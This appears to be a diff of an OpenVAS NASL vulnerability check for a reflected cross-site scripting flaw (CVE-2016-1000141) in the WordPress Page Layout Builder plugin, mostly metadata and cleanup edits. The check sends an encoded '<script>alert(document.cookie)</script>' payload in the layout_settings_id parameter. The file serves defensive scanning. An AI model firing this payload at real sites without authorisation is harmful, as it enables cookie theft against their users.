@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_page_layout_builder_plugin_xss_vuln.nasl 4954 2017-01-05 12:18:53Z antu123 $
+# $Id: gb_wordpress_page_layout_builder_plugin_xss_vuln.nasl 11516 2018-09-21 11:15:17Z asteins $
 #
 # Wordpress Page Layout Builder Plugin Reflected Cross Site Scripting Vulnerability
 #
@@ -29,35 +29,33 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.809081");
-  script_version("$Revision: 4954 $");
+  script_version("$Revision: 11516 $");
   script_cve_id("CVE-2016-1000141");
   script_bugtraq_id(93804);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-01-05 13:18:53 +0100 (Thu, 05 Jan 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-21 13:15:17 +0200 (Fri, 21 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-10-25 11:30:49 +0530 (Tue, 25 Oct 2016)");
   script_tag(name:"qod_type", value:"remote_analysis");
   script_name("Wordpress Page Layout Builder Plugin Reflected Cross Site Scripting Vulnerability");
 
-  script_tag(name:"summary", value:"This host is installed with wordpress 
-  page-layout-builder plugin and is prone to reflected cross site scripting 
+  script_tag(name:"summary", value:"This host is installed with wordpress
+  page-layout-builder plugin and is prone to reflected cross site scripting
   vulnerability.");
 
   script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
   and check whether it is able to execute arbitrary script or not.");
 
-  script_tag(name:"insight", value:"The flaw is due to an insufficient 
+  script_tag(name:"insight", value:"The flaw is due to an insufficient
   sanitization of user supplied input via variable 'layout_settings_id'
   to file '/page-layout-builder/includes/layout-settings.php'.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote
   attacker to create a specially crafted request that would execute arbitrary
   script code in a user's browser session within the trust relationship between
-  their browser and the server.
+  their browser and the server.");
 
-  Impact Level: Application");
-
-  script_tag(name:"affected", value:"Wordpress plugin page-layout-builder version 
+  script_tag(name:"affected", value:"Wordpress plugin page-layout-builder version
   1.9.3.");
 
   script_tag(name:"solution", value:"Upgrade to version 2.0.0. or higher,
@@ -65,7 +63,7 @@ if(description)
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://www.vapidlabs.com/wp/wp_advisory.php?v=358");
+  script_xref(name:"URL", value:"http://www.vapidlabs.com/wp/wp_advisory.php?v=358");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
@@ -81,27 +79,17 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = 0;
-report = "";
-dir = "";
-url = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-##Construct Attack Request
 url = dir + '/wp-content/plugins/page-layout-builder/includes/layout-settings.php?' +
             'layout_settings_id=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E%3C%22';
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\);</script>",
   extra_check:"/page-layout-builder/includes/layout-settings.php"))
